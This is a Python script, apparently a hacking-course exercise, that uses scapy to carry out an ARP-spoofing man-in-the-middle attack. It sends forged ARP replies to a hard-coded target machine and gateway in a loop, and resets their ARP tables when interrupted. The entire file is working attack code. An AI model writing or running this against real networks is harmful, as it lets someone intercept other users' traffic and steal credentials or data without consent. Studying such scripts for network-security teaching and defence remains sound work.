#!/usr/bin/env python
# This program fools router and target machine and makes you to be the man in the middle

import scapy.all as scapy
import time
import sys

# this will get target machines mac address
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

# this is the main feature which will create a packet we are attack to router and target machine
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# this block of code will run arp spoof and spoof the targets, putting us middle of the connection
target_ip = "192.168.182.140"
gateway_ip = "192.168.182.2"

try:
    packets_sent_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packets_sent_count = packets_sent_count + 2
        print("\r[+] Packets sent: " + str(packets_sent_count), end="")
        time.sleep(2)
# When user uses ctrl + c program will be closed, and it will reset ARP tables
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ..... Resetting ARP tables..... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)